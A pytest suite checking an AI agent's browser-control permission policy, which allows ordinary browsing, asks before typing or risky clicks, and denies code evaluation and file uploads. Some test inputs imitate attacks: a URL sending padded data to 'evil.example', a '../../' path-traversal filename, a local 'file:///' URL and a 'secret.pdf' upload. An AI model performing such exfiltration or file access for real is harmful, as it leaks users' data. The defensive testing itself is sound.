import pytest

from alfred.agent.permissions import PermissionPolicy, summarize
from alfred.config import load_config
from alfred.tools import browser_control as bc


@pytest.fixture
def policy(tmp_path):
    cfg = load_config(tmp_path / "none.yaml")
    cfg["browser_control"]["enabled"] = True
    return PermissionPolicy(cfg)


def act(policy, tool, **args):
    return policy.decide("mcp__browser__" + tool, args).action


def test_ordinary_browsing_is_automatic(policy):
    assert act(policy, "browser_navigate", url="https://www.youtube.com/results?search_query=lofi") == "allow"
    assert act(policy, "browser_click", element="Play (k)", target="e12") == "allow"
    assert act(policy, "browser_click", element="Next video link", target="e3") == "allow"
    assert act(policy, "browser_snapshot") == "allow"
    assert act(policy, "browser_press_key", key="k") == "allow"
    assert act(policy, "browser_tabs", action="new") == "allow"


def test_typing_forms_and_risky_clicks_ask(policy):
    assert act(policy, "browser_type", element="Search box", target="e1", text="lofi") == "ask"
    assert act(policy, "browser_fill_form", fields=[{"name": "Email", "value": "x"}]) == "ask"
    assert act(policy, "browser_select_option", element="Country", values=["DK"]) == "ask"
    assert act(policy, "browser_press_key", key="Enter") == "ask"
    for label in ["Buy now", "Place order", "Pay with card", "Submit", "Send message", "Delete account",
                  "Confirm booking", "Subscribe", "Sign out"]:
        assert act(policy, "browser_click", element=label, target="e9") == "ask", label
    assert act(policy, "browser_click", target="e9") == "ask"  # no description -> can't judge -> ask
    assert act(policy, "browser_handle_dialog", accept=True) == "ask"
    assert act(policy, "browser_handle_dialog", accept=False) == "allow"


def test_code_uploads_and_file_writes(policy):
    assert act(policy, "browser_evaluate", function="() => 1") == "deny"
    assert act(policy, "browser_run_code_unsafe", code="x") == "deny"
    assert act(policy, "browser_file_upload", paths=["C:/secret.pdf"]) == "deny"
    assert act(policy, "browser_drop", paths=["C:/secret.pdf"]) == "deny"
    assert act(policy, "browser_snapshot", filename="../../x.md") == "ask"
    assert act(policy, "browser_navigate", url="https://evil.example/?d=" + "A" * 300) == "ask"
    assert act(policy, "browser_navigate", url="file:///c:/") == "deny"
    assert act(policy, "browser_brand_new_tool") == "ask"


def test_off_by_default_and_deny_modes(tmp_path):
    cfg = load_config(tmp_path / "none.yaml")
    assert PermissionPolicy(cfg).decide("mcp__browser__browser_click", {"element": "Play"}).action == "deny"
    cfg["browser_control"].update(enabled=True, on_type="deny", on_risky_click="deny")
    p = PermissionPolicy(cfg)
    assert p.decide("mcp__browser__browser_type", {"text": "x"}).action == "deny"
    assert p.decide("mcp__browser__browser_click", {"element": "Buy now"}).action == "deny"


def test_spoken_summaries():
    assert summarize("mcp__browser__browser_type", {"element": "the search box", "text": "lofi beats", "submit": True})[0] \
        == 'I want to type "lofi beats" into the search box and hit enter.'
    assert summarize("mcp__browser__browser_click", {"element": "Buy now"})[0] == 'I want to click "Buy now".'
    assert "Email" in summarize("mcp__browser__browser_fill_form", {"fields": [{"name": "Email", "value": "a"}]})[0]


def test_server_config(tmp_path):
    cfg = load_config(tmp_path / "none.yaml")
    s = bc.server_config(cfg)
    assert s["command"] == "npx" and "@playwright/mcp@latest" in s["args"] and "--user-data-dir" in s["args"]
    cfg["browser_control"]["use_my_chrome"] = True
    assert "--extension" in bc.server_config(cfg)["args"]
